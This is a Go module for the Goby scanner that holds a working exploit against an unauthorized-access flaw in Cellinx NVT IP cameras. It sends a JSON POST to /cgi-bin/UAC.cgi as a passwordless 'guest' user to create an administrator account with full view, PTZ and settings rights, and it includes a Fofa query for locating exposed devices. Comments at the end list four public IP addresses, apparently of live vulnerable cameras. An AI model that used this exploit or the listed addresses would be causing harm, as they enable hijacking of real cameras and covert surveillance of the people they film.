package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cellinx NVT UAC.cgi Unauthorized Access Vulnerability",
    "Description": "<p>The Cellinx NVT IP PTZ is a camera device made by the South Korean company Cellinx.</p><p>The unauthorized access vulnerability in Cellinx NVT UAC.cgi allows an attacker to obtain sensitive configuration information and add management users. As a result, the attacker can log in to the camera background through the added management account, view the real-time camera screen, and control the device.</p>",
    "Product": "Cellinx-NVT",
    "Homepage": "https://www.ispyconnect.com/camera/cellinx",
    "DisclosureDate": "2023-02-23",
    "Author": "h1ei1",
    "FofaQuery": "body=\"local/NVT-string.js\"",
    "GobyQuery": "body=\"local/NVT-string.js\"",
    "Level": "2",
    "Impact": "<p>The unauthorized access vulnerability in Cellinx NVT UAC.cgi allows an attacker to obtain sensitive configuration information and add management users. As a result, the attacker can log in to the camera background through the added management account, view the real-time camera screen, and control the device.</p>",
    "Recommendation": "<p>1, the incoming data is strictly filtered to prevent the creation of users through the form of packets.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "username",
            "type": "input",
            "value": "testadm1n3",
            "show": ""
        },
        {
            "name": "password",
            "type": "input",
            "value": "testtest",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Cellinx NVT 摄像机 UAC.cgi 未授权访问漏洞",
            "Product": "Cellinx-NVT",
            "Description": "<p>Cellinx NVT IP PTZ 是韩国 Cellinx 公司的一个摄像机设备。</p><p>Cellinx NVT UAC.cgi 存在未授权访问漏洞，攻击者可执行获取配置敏感信息和添加管理用户等操作，导致攻击者可以通过添加的管理账户登入摄像机后台，查看摄像机实时画面，控制设备。<br></p>",
            "Recommendation": "<p>1、对传入的数据进行严格过滤，防止通过数据包形式创建用户。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Cellinx NVT UAC.cgi 存在未授权访问漏洞，攻击者可执行获取配置敏感信息和添加管理用户等操作，导致攻击者可以通过添加的管理账户登入摄像机后台，查看摄像机实时画面，控制设备。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Cellinx NVT UAC.cgi Unauthorized Access Vulnerability",
            "Product": "Cellinx-NVT",
            "Description": "<p>The Cellinx NVT IP PTZ is a camera device made by the South Korean company Cellinx.</p><p>The unauthorized access vulnerability in Cellinx NVT UAC.cgi allows an attacker to obtain sensitive configuration information and add management users. As a result, the attacker can log in to the camera background through the added management account, view the real-time camera screen, and control the device.</p>",
            "Recommendation": "<p>1, the incoming data is strictly filtered to prevent the creation of users through the form of packets.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>The unauthorized access vulnerability in Cellinx NVT UAC.cgi allows an attacker to obtain sensitive configuration information and add management users. As a result, the attacker can log in to the camera background through the added management account, view the real-time camera screen, and control the device.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10812"
}`

	cfgDefine := func(cfgData string) *httpclient.RequestConfig {
		uri := "/cgi-bin/UAC.cgi?TYPE=json"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/json; charset=UTF-8")
		cfg.Data = cfgData
		return cfg
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randName := goutils.RandomHexString(6)
			randPass := goutils.RandomHexString(6)
			cfgData := fmt.Sprintf("{\"jsonData\":{\"username\":\"guest\",\"password\":\"\",\"option\":\"add_user\",\"data\":{\"username\":\"%s\",\"password\":\"%s\",\"permission\":{\"is_admin\":\"1\",\"view\":\"1\",\"ptz\":\"1\",\"setting\":\"1\",\"dout\":\"1\"}}}}", randName, randPass)
			cfg := cfgDefine(cfgData)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "\"add_user\":{\"result\" : \"Success\"}") {
				cfg2Data := fmt.Sprintf("{\"jsonData\":{\"username\":\"guest\",\"password\":\"\",\"option\":\"delete_user\",\"data\":{\"username\":\"%s\"}}}", randName)
				cfg2 := cfgDefine(cfg2Data)
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "\"delete_user\":{\"result\" : \"Success\"}")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			randName := ss.Params["username"].(string)
			randPass := ss.Params["password"].(string)
			cfgData := fmt.Sprintf("{\"jsonData\":{\"username\":\"guest\",\"password\":\"\",\"option\":\"add_user\",\"data\":{\"username\":\"%s\",\"password\":\"%s\",\"permission\":{\"is_admin\":\"1\",\"view\":\"1\",\"ptz\":\"1\",\"setting\":\"1\",\"dout\":\"1\"}}}}", randName, randPass)
			cfg := cfgDefine(cfgData)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, "\"add_user\":{\"result\" : \"Success\"}") {
				expResult.Output = resp.RawBody
				expResult.Success = true
			}
			return expResult
		},
	))
}

//http://220.81.3.181
//http://222.103.133.119:801
//http://183.109.132.200
//http://220.94.52.243
